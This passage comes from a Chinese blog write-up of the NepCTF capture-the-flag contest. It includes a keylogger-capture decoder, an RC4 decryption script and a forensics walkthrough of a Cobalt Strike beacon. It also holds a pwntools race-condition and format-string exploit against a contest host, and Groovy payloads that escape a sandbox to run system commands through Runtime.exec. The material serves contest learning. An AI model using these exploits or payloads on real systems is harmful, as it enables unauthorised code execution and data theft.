class="number">0x1e</span> + i: <span class="built_in">str</span>((i + <span class="number">1</span>) % <span class="number">10</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>)&#125;,       <span class="comment"># 1-9,0</span></span><br><span class="line">    <span class="number">0x2c</span>: <span class="string">&#x27; &#x27;</span>, <span class="number">0x28</span>: <span class="string">&#x27;\n&#x27;</span>, <span class="number">0x2b</span>: <span class="string">&#x27;\t&#x27;</span>,</span><br><span class="line">    <span class="number">0x2d</span>: <span class="string">&#x27;-&#x27;</span>, <span class="number">0x2e</span>: <span class="string">&#x27;=&#x27;</span>, <span class="number">0x2f</span>: <span class="string">&#x27;[&#x27;</span>, <span class="number">0x30</span>: <span class="string">&#x27;]&#x27;</span>, <span class="number">0x31</span>: <span class="string">&#x27;\\&#x27;</span>,</span><br><span class="line">    <span class="number">0x33</span>: <span class="string">&#x27;;&#x27;</span>, <span class="number">0x34</span>: <span class="string">&quot;&#x27;&quot;</span>, <span class="number">0x35</span>: <span class="string">&#x27;`&#x27;</span>, <span class="number">0x36</span>: <span class="string">&#x27;,&#x27;</span>, <span class="number">0x37</span>: <span class="string">&#x27;.&#x27;</span>, <span class="number">0x38</span>: <span class="string">&#x27;/&#x27;</span>,</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># --- 2. Shift 后字符映射 ------------------------------------------</span></span><br><span class="line">shift_map = &#123;c: c.upper() <span class="keyword">for</span> c <span class="keyword">in</span> <span class="string">&#x27;abcdefghijklmnopqrstuvwxyz&#x27;</span>&#125;</span><br><span class="line">shift_map.update(&#123;</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>: <span class="string">&#x27;!&#x27;</span>, <span class="string">&#x27;2&#x27;</span>: <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;3&#x27;</span>: <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;4&#x27;</span>: <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;5&#x27;</span>: <span class="string">&#x27;%&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;6&#x27;</span>: <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;7&#x27;</span>: <span class="string">&#x27;&amp;&#x27;</span>, <span class="string">&#x27;8&#x27;</span>: <span class="string">&#x27;*&#x27;</span>, <span class="string">&#x27;9&#x27;</span>: <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;0&#x27;</span>: <span class="string">&#x27;)&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;-&#x27;</span>: <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;=&#x27;</span>: <span class="string">&#x27;+&#x27;</span>, <span class="string">&#x27;[&#x27;</span>: <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;]&#x27;</span>: <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;\\&#x27;</span>: <span class="string">&#x27;|&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;;&#x27;</span>: <span class="string">&#x27;:&#x27;</span>, <span class="string">&quot;&#x27;&quot;</span>: <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;`&#x27;</span>: <span class="string">&#x27;~&#x27;</span>, <span class="string">&#x27;,&#x27;</span>: <span class="string">&#x27;&lt;&#x27;</span>, <span class="string">&#x27;.&#x27;</span>: <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;/&#x27;</span>: <span class="string">&#x27;?&#x27;</span>,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br><span class="line">BACKSPACE_HID = <span class="number">0x2a</span>          <span class="comment"># MSC_SCAN 的 Backspace</span></span><br><span class="line">SHIFT_CODES   = &#123;<span class="number">42</span>, <span class="number">54</span>&#125;      <span class="comment"># EV_KEY 左/右 Shift code</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decode</span>(<span class="params">path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    buf, shift, last_hid = [], <span class="literal">False</span>, <span class="literal">None</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(path, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        <span class="keyword">for</span> chunk <span class="keyword">in</span> <span class="built_in">iter</span>(<span class="keyword">lambda</span>: f.read(<span class="number">24</span>), <span class="string">b&#x27;&#x27;</span>):</span><br><span class="line">            tv_sec, tv_usec, etype, code, value = struct.unpack(<span class="string">&#x27;&lt;qqHHI&#x27;</span>, chunk)</span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> etype == <span class="number">4</span> <span class="keyword">and</span> code == <span class="number">4</span>:         <span class="comment"># MSC_SCAN，保存 HID usage</span></span><br><span class="line">                last_hid = value &amp; <span class="number">0xffff</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> etype != <span class="number">1</span>:                       <span class="comment"># 只关心 EV_KEY</span></span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span> value == <span class="number">1</span>:                       <span class="comment"># 按下</span></span><br><span class="line">                <span class="keyword">if</span> code <span class="keyword">in</span> SHIFT_CODES:          <span class="comment"># Shift 键按下</span></span><br><span class="line">                    shift = <span class="literal">True</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line">                <span class="keyword">if</span> (last_hid <span class="keyword">or</span> code) == BACKSPACE_HID <span class="keyword">or</span> code == <span class="number">14</span>:</span><br><span class="line">                    <span class="keyword">if</span> buf:</span><br><span class="line">                        buf.pop()</span><br><span class="line">                    last_hid = <span class="literal">None</span></span><br><span class="line">                    <span class="keyword">continue</span></span><br><span class="line"></span><br><span class="line">                hid = last_hid <span class="keyword">if</span> last_hid <span class="keyword">else</span> code</span><br><span class="line">                ch  = hid2char.get(hid)</span><br><span class="line">                <span class="keyword">if</span> ch:</span><br><span class="line">                    buf.append(shift_map[ch] <span class="keyword">if</span> shift <span class="keyword">and</span> ch <span class="keyword">in</span> shift_map <span class="keyword">else</span> ch)</span><br><span class="line">                last_hid = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">            <span class="keyword">elif</span> value == <span class="number">0</span> <span class="keyword">and</span> code <span class="keyword">in</span> SHIFT_CODES:  <span class="comment"># Shift 松开</span></span><br><span class="line">                shift = <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;</span>.join(buf)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    p = sys.argv[<span class="number">1</span>] <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) &gt; <span class="number">1</span> <span class="keyword">else</span> <span class="string">&#x27;NepBot_keylogger&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> pathlib.Path(p).exists():</span><br><span class="line">        sys.exit(<span class="string">f&#x27;文件 <span class="subst">&#123;p&#125;</span> 不存在&#x27;</span>)</span><br><span class="line">    text = decode(p)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 快速检验：先打印前 400 字符看看有没有完好的命令</span></span><br><span class="line">    <span class="built_in">print</span>(text[:<span class="number">400</span>])</span><br><span class="line"></span><br><span class="line">    <span class="comment"># --- 3. 自动提取数据库名 --------------------------------------</span></span><br><span class="line">    m = re.search(<span class="string">r&#x27;use\s+`?([A-Za-z0-9_\-]+)`?;&#x27;</span>, text, re.I)</span><br><span class="line">    <span class="keyword">if</span> m:</span><br><span class="line">        dbname = m.group(<span class="number">1</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n&gt;&gt;&gt; 解析到 use 语句：&#x27;</span>, m.group(<span class="number">0</span>).strip())</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&gt;&gt;&gt; 数据库名：<span class="subst">&#123;dbname&#125;</span>&#x27;</span>)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&#x27;&gt;&gt;&gt; 提交 flag：NepCTF&#123;&#123;<span class="subst">&#123;dbname&#125;</span>&#125;&#125;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;\n!!! 没找到 use 语句，估计还有 Ctrl+U / Ctrl+W 等需处理，再检查原始输出&#x27;</span>)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="SpeedMino"><a href="#SpeedMino" class="headerlink" title="SpeedMino"></a>SpeedMino</h3><p>拖入IDA后依旧是丢给deepseek，识别到是love框架，将exe改成zip进行解压得到源码，对应源码逻辑运行即可：</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">KSA</span>():</span><br><span class="line">    key = <span class="string">&quot;Speedmino Created By MrZ and modified by zxc&quot;</span></span><br><span class="line">    key_len = <span class="built_in">len</span>(key)</span><br><span class="line">    S = <span class="built_in">list</span>(<span class="built_in">range</span>(<span class="number">256</span>))</span><br><span class="line">    j = <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">        j = (j + S[i] + <span class="built_in">ord</span>(key[i % key_len])) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">    <span class="keyword">return</span> S</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">calcData</span>(<span class="params">text_table, S, i, j</span>):</span><br><span class="line">    text_len = text_table[<span class="number">0</span>]</span><br><span class="line">    K = [<span class="number">0</span>] * (text_len + <span class="number">1</span>)</span><br><span class="line">    K[<span class="number">0</span>] = text_len</span><br><span class="line">    <span class="keyword">for</span> n <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, text_len + <span class="number">1</span>):</span><br><span class="line">        i = (i + <span class="number">1</span>) % <span class="number">256</span></span><br><span class="line">        j = (j + S[i]) % <span class="number">256</span></span><br><span class="line">        S[i], S[j] = S[j], S[i]</span><br><span class="line">        K_byte = S[(S[i] + S[j]) % <span class="number">256</span>]</span><br><span class="line">        K[n] = (text_table[n] + K_byte) % <span class="number">256</span></span><br><span class="line">    <span class="keyword">return</span> K, S, i, j</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">tableToStr</span>(<span class="params">text</span>):</span><br><span class="line">    text_len = text[<span class="number">0</span>]</span><br><span class="line">    outstring = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, text_len + <span class="number">1</span>):</span><br><span class="line">        c = text[i]</span><br><span class="line">        <span class="keyword">if</span> c &lt; <span class="number">32</span> <span class="keyword">or</span> c &gt;= <span class="number">127</span>:</span><br><span class="line">            outstring += <span class="string">&quot;#&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            outstring += <span class="built_in">chr</span>(c)</span><br><span class="line">    <span class="keyword">return</span> outstring</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 youwillget</span></span><br><span class="line">youwillget = [<span class="number">52</span>, <span class="number">187</span>, <span class="number">24</span>, <span class="number">5</span>, <span class="number">131</span>, <span class="number">58</span>, <span class="number">243</span>, <span class="number">176</span>, <span class="number">235</span>, <span class="number">179</span>, <span class="number">159</span>, <span class="number">170</span>, <span class="number">155</span>, <span class="number">201</span>, <span class="number">23</span>, <span class="number">6</span>, <span class="number">3</span>,</span><br><span class="line">              <span class="number">210</span>, <span class="number">27</span>, <span class="number">113</span>, <span class="number">11</span>, <span class="number">161</span>, <span class="number">94</span>, <span class="number">245</span>, <span class="number">41</span>, <span class="number">29</span>, <span class="number">43</span>, <span class="number">199</span>, <span class="number">8</span>, <span class="number">200</span>, <span class="number">252</span>, <span class="number">86</span>, <span class="number">17</span>, <span class="number">72</span>,</span><br><span class="line">              <span class="number">177</span>, <span class="number">52</span>, <span class="number">252</span>, <span class="number">20</span>, <span class="number">74</span>, <span class="number">111</span>, <span class="number">53</span>, <span class="number">28</span>, <span class="number">6</span>, <span class="number">190</span>, <span class="number">108</span>, <span class="number">47</span>, <span class="number">16</span>, <span class="number">237</span>, <span class="number">148</span>, <span class="number">82</span>, <span class="number">253</span>, <span class="number">148</span>, <span class="number">6</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 初始化 S-box 和状态</span></span><br><span class="line">S = KSA()</span><br><span class="line">secret_i, secret_j = <span class="number">0</span>, <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 模拟剪贴板加密（55个空格）</span></span><br><span class="line">pass_table = [<span class="number">55</span>] + [<span class="number">32</span>] * <span class="number">55</span></span><br><span class="line">_, S, secret_i, secret_j = calcData(pass_table, S, secret_i, secret_j)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 应用 2600 次加密</span></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">2600</span>):</span><br><span class="line">    youwillget, S, secret_i, secret_j = calcData(youwillget, S, secret_i, secret_j)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换为字符串</span></span><br><span class="line">flag = tableToStr(youwillget)</span><br><span class="line"><span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure></div>
+
+<h3 id="客服小美"><a href="#客服小美" class="headerlink" title="客服小美"></a>客服小美</h3><p>非常麻烦的一道题，写了好久</p>
+<p>首先是进到内存去分析，找到很可疑的文件：</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/1.png" class title="内存分析">
+
+<p>那么很明显，触发这个文件的用户就是被控机器的用户名</p>
+<p>接着就是检查网络连接：</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/2.png" class title="windows.netscan">
+
+<p>中文导致的解码混乱，不过依旧可以辨认</p>
+<p>连接地址和端口都找到了</p>
+<p>接下来就是分析流量内容</p>
+<p>扔到云沙箱，识别出CS Beacon特征。</p>
+<p>使用cs-extract-key.py提取出raw key</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/3.png" class title="cs-extract-key.py分析">
+
+<p>然后用这个key解密流量即可</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/4.png" class title="解密流量1">
+
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/5.png" class title="解密流量2">
+
+<p>很明显secret.txt就是流量中这个</p>
+<h3 id="MoewBle喵泡"><a href="#MoewBle喵泡" class="headerlink" title="MoewBle喵泡"></a>MoewBle喵泡</h3><p>可以玩游戏通过获得，但也可以直接到level1&#x2F;2&#x2F;3里面搜索字符串</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/6.png" class title="直接找到字符串">
+
+<p>GM的开启方法是AI根据源码分析出来的：</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/7.png" class title="虽然我也没看出来是怎么分析出来的（大嘘）">
+
+<p>然后到GM拿最后一部分：</p>
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/8.png" class title="getflag 7">
+
+<h2 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h2><h3 id="Time"><a href="#Time" class="headerlink" title="Time"></a>Time</h3><p>最开始没什么思路，后来看到time和hint.txt的内容想到条件竞争</p>
+<p>依旧是deepseek给的脚本（我是AI糕手）</p>
+<div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;info&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 转换函数（保留）</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hex_to_flag</span>(<span class="params">hex_str</span>):</span><br><span class="line">    parts = hex_str.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    flag = <span class="string">b&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> part <span class="keyword">in</span> parts:</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> part: </span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(part) % <span class="number">2</span> != <span class="number">0</span>:</span><br><span class="line">            part = <span class="string">&#x27;0&#x27;</span> + part</span><br><span class="line">        part_bytes = unhex(part)</span><br><span class="line">        flag += part_bytes[::-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> flag.rstrip(<span class="string">b&#x27;\x00&#x27;</span>).decode(errors=<span class="string">&#x27;ignore&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 配置</span></span><br><span class="line">host = <span class="string">&quot;nepctf30-gg7y-7alr-c6ry-eveuvmbdv110.nepctf.com&quot;</span></span><br><span class="line">port = <span class="number">443</span></span><br><span class="line">fmt_payload = <span class="string">b&quot;%22$lx.%23$lx.%24$lx.%25$lx.%26$lx.%27$lx.%28$lx.%29$lx&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">trigger_race</span>():</span><br><span class="line">    <span class="string">&quot;&quot;&quot;触发条件竞争&quot;&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            p = remote(host, port, ssl=<span class="literal">True</span>, timeout=<span class="number">5</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 第一阶段：设置格式化字符串</span></span><br><span class="line">            p.sendlineafter(<span class="string">b&quot;name:&quot;</span>, fmt_payload)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 第二阶段：快速发送两个文件名</span></span><br><span class="line">            p.recvuntil(<span class="string">b&quot;read:&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 先发送合法文件名通过检查</span></span><br><span class="line">            p.sendline(<span class="string">b&quot;hint.txt&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 立即发送恶意文件名覆盖全局变量</span></span><br><span class="line">            p.sendline(<span class="string">b&quot;/flag&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="comment"># 捕获输出</span></span><br><span class="line">            output = p.recvall(timeout=<span class="number">3</span>)</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;hello&#x27;</span> <span class="keyword">in</span> output:</span><br><span class="line">                log.info(<span class="string">&quot;Potential race success!&quot;</span>)</span><br><span class="line">                <span class="comment"># 提取泄露数据</span></span><br><span class="line">                <span class="keyword">try</span>:</span><br><span class="line">                    hello_idx = output.index(<span class="string">b&#x27;hello &#x27;</span>) + <span class="number">6</span></span><br><span class="line">                    end_idx = output.index(<span class="string">b&#x27; ,your file read done!&#x27;</span>)</span><br><span class="line">                    leaked_hex = output[hello_idx:end_idx].decode()</span><br><span class="line">                    flag_content = hex_to_flag(leaked_hex)</span><br><span class="line">                    </span><br><span class="line">                    <span class="keyword">if</span> <span class="string">&quot;NepCTF&quot;</span> <span class="keyword">in</span> flag_content:</span><br><span class="line">                        log.success(<span class="string">f&quot;FLAG FOUND: <span class="subst">&#123;flag_content&#125;</span>&quot;</span>)</span><br><span class="line">                        <span class="keyword">return</span> flag_content</span><br><span class="line">                <span class="keyword">except</span>:</span><br><span class="line">                    log.warning(<span class="string">&quot;Failed to parse output&quot;</span>)</span><br><span class="line">            </span><br><span class="line">            p.close()</span><br><span class="line">            time.sleep(<span class="number">0.5</span>)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            log.warning(<span class="string">f&quot;Error: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">            time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 多线程提高成功率</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">threaded_race</span>(<span class="params">thread_count=<span class="number">4</span></span>):</span><br><span class="line">    results = []</span><br><span class="line">    lock = threading.Lock()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">worker</span>():</span><br><span class="line">        flag = trigger_race()</span><br><span class="line">        <span class="keyword">if</span> flag:</span><br><span class="line">            <span class="keyword">with</span> lock:</span><br><span class="line">                results.append(flag)</span><br><span class="line">    </span><br><span class="line">    threads = []</span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(thread_count):</span><br><span class="line">        t = threading.Thread(target=worker)</span><br><span class="line">        t.daemon = <span class="literal">True</span></span><br><span class="line">        t.start()</span><br><span class="line">        threads.append(t)</span><br><span class="line">    </span><br><span class="line">    <span class="comment"># 等待结果或超时</span></span><br><span class="line">    start_time = time.time()</span><br><span class="line">    <span class="keyword">while</span> time.time() - start_time &lt; <span class="number">60</span> <span class="keyword">and</span> <span class="keyword">not</span> results:</span><br><span class="line">        time.sleep(<span class="number">0.5</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> results:</span><br><span class="line">        <span class="keyword">return</span> results[<span class="number">0</span>]</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    log.info(<span class="string">&quot;Starting race condition attack...&quot;</span>)</span><br><span class="line">    flag = threaded_race()</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> flag:</span><br><span class="line">        log.success(<span class="string">f&quot;Final Flag: <span class="subst">&#123;flag&#125;</span>&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        log.error(<span class="string">&quot;Failed to capture flag after multiple attempts&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>
+
+<h2 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h2><h3 id="easyGooGooVVVY"><a href="#easyGooGooVVVY" class="headerlink" title="easyGooGooVVVY"></a>easyGooGooVVVY</h3><p>貌似是出题人失误没过滤execute，直接一句简单的payload即可</p>
+<p><code>&quot;e&quot;.concat(&quot;nv&quot;).execute().text</code></p>
+<h3 id="RevengeGooGooVVVY"><a href="#RevengeGooGooVVVY" class="headerlink" title="RevengeGooGooVVVY"></a>RevengeGooGooVVVY</h3><p>这次过滤掉了execute</p>
+<div class="highlight-container" data-rel="Groovy"><figure class="iseeu highlight groovy"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过对象数组获取类引用</span></span><br><span class="line"><span class="keyword">def</span> classes = [] <span class="keyword">as</span> Object[]</span><br><span class="line">classes.getClass().componentType</span><br><span class="line">  .forName(<span class="string">&quot;java.lang.Runtime&quot;</span>)</span><br><span class="line">  .getMethod(<span class="string">&quot;getRuntime&quot;</span>)</span><br><span class="line">  .invoke(<span class="literal">null</span>)</span><br><span class="line">  .exec(<span class="string">&quot;env&quot;</span>)</span><br><span class="line">  .getInputStream()</span><br><span class="line">  .text</span><br></pre></td></tr></table></figure></div>
+
+<img lazyload src="/images/loading.svg" data-src="/2025/07/28/nepctf-wp/9.png" class title="运行结果">
+
+<h3 id="JavaSeri"><a href="#JavaSeri" class="headerlink" title="JavaSeri"></a>JavaSeri</h3><p>出题人的失误，shiro-attack一把梭了<del>（pentest说是）</del></p>
+<hr>
+<h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>NepCTF是这么长时间以来少有的题目质量高而且参与感强的比赛了，在这次比赛中又学到不少东西，不过挺遗憾没拿到任何奖项，希望下次尽力吧。</p>
+<p>有一个知识点的内容卡了我很久，后面认真学习过后或许会写一篇文章记录一下</p>
+
+        </div>
+
+        
+            <div class="post-copyright-info w-full my-8 px-2 sm:px-6 md:px-8">
+                <div class="article-copyright-info-container">
+    <ul>
+        <li><strong>标题:</strong> NepCTF个人WP与赛后总结</li>
+        <li><strong>作者:</strong> Wang1r</li>
+        <li><strong>创建于
+                :</strong> 2025-07-28 20:16:20</li>
+        
+            <li>
+                <strong>更新于
+                    :</strong> 2025-07-28 14:56:54
+            </li>
+        
+        <li>
+            <strong>链接:</strong> https://wang1rrr.github.io/2025/07/28/nepctf-wp/
+        </li>
+        <li>
+            <strong>
+                版权声明:
+            </strong>
+            
+
+            
+                本文章采用 <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0">CC BY-NC-SA 4.0</a> 进行许可。
+            
+        </li>
+    </ul>
+</div>
+
+            </div>
+        
+
+        
+            <ul class="post-tags-box text-lg mt-1.5 flex-wrap justify-center flex md:hidden">
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/CTF/">#CTF</a>&nbsp;
+                    </li>
+                
+                    <li class="tag-item mx-0.5">
+                        <a href="/tags/WP/">#WP</a>&nbsp;
+                    </li>
+                
+            </ul>
+        
+
+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                    <div class="article-prev border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="prev"
+                        rel="prev"
+                        href="/2025/08/03/%E7%94%B1%E4%B8%80%E9%81%93CTF%E9%A2%98%E5%87%BA%E5%8F%91%E7%9A%84python%E5%AF%B9%E8%B1%A1%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%88%86%E6%9E%90/"
+                        >
+                            <span class="left arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-left"></i>
+                            </span>
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">由一道CTF题出发的python对象学习与分析</span>
